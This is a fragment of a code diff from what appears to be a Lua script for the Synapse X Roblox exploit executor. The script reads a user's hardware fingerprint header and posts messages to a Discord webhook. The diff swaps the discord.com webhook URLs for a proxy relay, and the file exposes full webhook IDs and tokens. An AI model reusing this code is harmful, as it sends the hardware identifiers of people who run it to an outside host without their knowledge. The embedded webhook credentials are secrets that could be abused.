@@ -8,7 +8,7 @@ local hwid = decoded.headers["Syn-Fingerprint"]
 
 local response = syn.request(
     {
-        Url = 'https://discord.com/api/webhooks/1085399114465943694/-MLLGjl2G8urgB0vITkxP8c_VCkDy0Dg2hYN74Fa5Cva57Tqiih-rQTcjObykUMIuv4D',
+        Url = 'https://webhook.lewisakura.moe/api/webhooks/1085595166628388884/gTubeBJ2uH9-LhwrVqma4t-B-xNkjVYevMA-2YqUuRjtJKn55-Bm7KR2EpKtoNeiyjjn',
         Method = 'POST',
         Headers = {
             ['Content-Type'] = 'application/json'
@@ -31,7 +31,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1085399114465943694/-MLLGjl2G8urgB0vITkxP8c_VCkDy0Dg2hYN74Fa5Cva57Tqiih-rQTcjObykUMIuv4D"
+   "https://webhook.lewisakura.moe/api/webhooks/1085595166628388884/gTubeBJ2uH9-LhwrVqma4t-B-xNkjVYevMA-2YqUuRjtJKn55-Bm7KR2EpKtoNeiyjjn"
 local data = {
    ["content"] = " message(no embed)- you can take out embed if by deleting the bottom stuff(where it says EMBEDS)",
    ["embeds"] = {
